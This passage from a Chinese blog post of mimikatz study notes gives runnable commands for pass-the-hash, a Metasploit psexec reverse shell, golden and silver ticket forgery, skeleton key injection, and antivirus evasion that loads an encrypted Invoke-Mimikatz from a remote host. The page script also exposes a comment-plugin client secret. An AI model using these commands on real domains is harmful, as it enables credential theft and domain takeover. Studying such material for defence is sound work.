</span></span></code></pre></td></tr></table>
</div>
</div><p>在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。</p>
<blockquote>
<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。</p>
</blockquote>
<h4 id="域环境">域环境</h4>
<p>在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span>
</span></span><span class="line"><span class="cl">sekurlsa::pth /user:administrator /domain:<span class="s2">&#34;testyu.com&#34;</span> /ntlm:dbd621b8ed24eb627d32514476fac6c5 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用域用户test的NTLM哈希值对域控进行哈希传递攻击</span>
</span></span><span class="line"><span class="cl">sekurlsa::pth /user:test /domain:<span class="s2">&#34;testyu.com&#34;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="msf进行哈希传递">MSF进行哈希传递</h4>
<p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>exploit/windows/smb/psexec</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf &gt; use  exploit/windows/smb/psexec
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; <span class="nb">set</span> lhost 192.168.10.27
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; <span class="nb">set</span> rhost 192.168.10.14
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; <span class="nb">set</span> smbuser Administrator
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; <span class="nb">set</span> smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   <span class="c1">#这里LM和NTLM我们已经获取到了</span>
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>psexec<span class="o">)</span> &gt; exploit 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="票据传递攻击ptt">票据传递攻击(PTT)</h3>
<h4 id="黄金票据">黄金票据</h4>
<p>域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</p>
<p>首先获取krbtgt的用户hash:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz <span class="s2">&#34;lsadump::dcsync /domain:xx.com /user:krbtgt&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
</span></span><span class="line"><span class="cl">Copy#导入刚才生成的票据
</span></span><span class="line"><span class="cl">kerberos::ptt test.kiribi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#导入成功后可获取域管权限</span>
</span></span><span class="line"><span class="cl">dir <span class="se">\\</span>dc.abc.com<span class="se">\c</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="白银票据">白银票据</h4>
<p>黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</p>
<p>白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#在域控上导出 DC$ 的 HASH</span>
</span></span><span class="line"><span class="cl">mimikatz log <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonpasswords&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据</span>
</span></span><span class="line"><span class="cl">kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统</span>
</span></span><span class="line"><span class="cl">dir <span class="se">\\</span>DC.ABC.COM<span class="se">\C</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="skeleton-key">skeleton key</h4>
<p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Copy</span><span class="c1">#在域控上安装 skeleton key
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">mimikatz</span><span class="o">.</span><span class="nx">exe</span> <span class="nx">privilege</span><span class="o">::</span><span class="na">debug</span> <span class="s2">&#34;misc::skeleton&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">net</span> <span class="k">use</span> <span class="nx">\\WIN</span><span class="o">-</span><span class="mi">9</span><span class="nx">P499QKTLDO</span><span class="o">.</span><span class="nx">adtest</span><span class="o">.</span><span class="nx">com\c</span><span class="err">$</span> <span class="nx">mimikatz</span> <span class="o">/</span><span class="nx">user</span><span class="o">:</span><span class="nx">adtest\administrator</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="l">Copy#适用系统</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">windows 8.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">windows server 2012 及以上</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Copyprivilege::debug
</span></span><span class="line"><span class="cl">!+
</span></span><span class="line"><span class="cl">!processprotect /process:lsass.exe /remove 
</span></span><span class="line"><span class="cl">misc::skeleton
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="ms14-068">MS14-068</h4>
<p>当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</p>
<p>MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Copysysteminfo <span class="p">|</span>find <span class="s2">&#34;3011780&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#为空说明该服务器存在MS14-068漏洞</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="导出chrome密码">导出chrome密码</h3>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247483949&amp;idx=1&amp;sn=db4853c88e4bf0a550c095d9017a363c&amp;chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1582350092849&amp;sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p>也有其他工具</p>
<h3 id="免杀">免杀</h3>
<p>Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</p>
<p>首先在本地对Invoke-Mimikatz.ps1进行加密处理：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Copypoweshell</span><span class="p">.</span><span class="py">exe</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Out-EncryptedScript</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="n">poweshell</span><span class="p">.</span><span class="py">exe</span> <span class="nb">Out-EncryptedScript</span> <span class="n">-ScriptPath</span> <span class="p">.\</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-Password</span> <span class="err">密码</span> <span class="n">-Salt</span> <span class="err">随机数</span>
</span></span><span class="line"><span class="cl"><span class="c">#默认生成的文件是evil.ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">-Password</span>   <span class="err">设置加密的密钥</span>
</span></span><span class="line"><span class="cl"><span class="n">-Salt</span>       <span class="err">随机数，防止被暴力破解</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将加密生成的evil.sp1脚本放在目标机上，执行如下命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Copy</span><span class="c">#远程加载解密脚本</span>
</span></span><span class="line"><span class="cl"><span class="n">poweshell</span><span class="p">.</span><span class="py">exe</span> 
</span></span><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">String</span><span class="p">]</span> <span class="nv">$cmd</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">evil</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Expression</span> <span class="nv">$cmd</span>
</span></span><span class="line"><span class="cl"><span class="nv">$decrypted</span> <span class="p">=</span> <span class="n">de</span> <span class="n">password</span> <span class="n">salt</span>
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Expression</span> <span class="nv">$decrypted</span>
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Mimikatz</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以自己修改mimikatz源码进行免杀。</p>
<h3 id="转载参考">转载&amp;参考</h3>
<p><a href="https://www.cnblogs.com/-mo-/p/11890232.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/-mo-/p/11890232.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2025-02-26&#32;12:33:09>更新于 2025-02-26&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"><span><a href="/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
      <div class="post-info-share">
        <span></span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/mimikatz/' class="post-tag">mimikatz</a><a href='/tags/%E5%90%8E%E6%B8%97%E9%80%8F/' class="post-tag">后渗透</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" class="post-nav-item" rel="prev" title="log4j2漏洞原理简单学习"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>log4j2漏洞原理简单学习</a>
      <a href="/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-nav-item" rel="next" title="R语言入门学习篇一">R语言入门学习篇一<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
      </noscript></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.115.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2022-02-08T12:12:02+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"mimikatz学习笔记"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"appendto":".wrapper\u003emain","colspacing":30,"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
</html>
